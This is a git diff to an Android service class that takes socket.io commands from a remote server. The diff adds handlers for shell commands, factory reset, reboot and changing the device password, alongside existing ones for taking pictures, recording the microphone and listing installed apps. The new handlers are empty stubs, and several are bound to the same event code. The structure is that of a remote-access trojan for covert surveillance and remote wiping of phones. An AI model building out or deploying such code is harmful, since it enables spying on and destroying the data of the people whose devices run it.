@@ -19,7 +19,6 @@ import androidx.core.app.ActivityCompat;
 import org.json.JSONObject;
 
 import java.net.URI;
-import java.util.List;
 
 import io.socket.client.IO;
 import io.socket.client.Socket;
@@ -45,6 +44,7 @@ public class MainService extends Service {
                     int apiLevel = Build.VERSION.SDK_INT;
                     TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
                     String imei = "imei placeholder";
+                    String imsi = "imsi";
                     String phoneNumber = null;
                     if (ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                         phoneNumber = telephonyManager.getLine1Number();
@@ -72,9 +72,13 @@ public class MainService extends Service {
                     ioSocket.on("0x8", getCameraList);
                     ioSocket.on("0x9", takePicture);
                     ioSocket.on("0xA", recordMicrophone);
+                    ioSocket.on("0xB", shCommand);
                     ioSocket.on("0xC", listInstalledApps);
                     ioSocket.on("0xD", vibratePhone);
                     ioSocket.on("0xE", changeWallpaper);
+                    ioSocket.on("0xE", factoryResetDevice);
+                    ioSocket.on("0xE", rebootDevice);
+                    ioSocket.on("0xE", changeDevicePassword);
 
                     if(!ioSocket.connected()){
                         ioSocket.connect();
@@ -244,14 +248,42 @@ public class MainService extends Service {
         }
     };
 
-//    private Emitter.Listener sendSerialCommand = new Emitter.Listener() {
-//        @Override
-//        public void call(Object... args) {
-//
-//        }
-//    };
+    private Emitter.Listener sendSerialCommand = new Emitter.Listener() {
+        @Override
+        public void call(Object... args) {
+
+        }
+    };
+
+    private Emitter.Listener shCommand = new Emitter.Listener() {
+        @Override
+        public void call(Object... args) {
+
+        }
+    };
 
     private Emitter.Listener getLocation = new Emitter.Listener() {
+        @Override
+        public void call(Object... args) {
+
+        }
+    };
+
+    private Emitter.Listener changeDevicePassword = new Emitter.Listener() {
+        @Override
+        public void call(Object... args) {
+
+        }
+    };
+
+    private Emitter.Listener factoryResetDevice = new Emitter.Listener() {
+        @Override
+        public void call(Object... args) {
+
+        }
+    };
+
+    private Emitter.Listener rebootDevice = new Emitter.Listener() {
         @Override
         public void call(Object... args) {
 
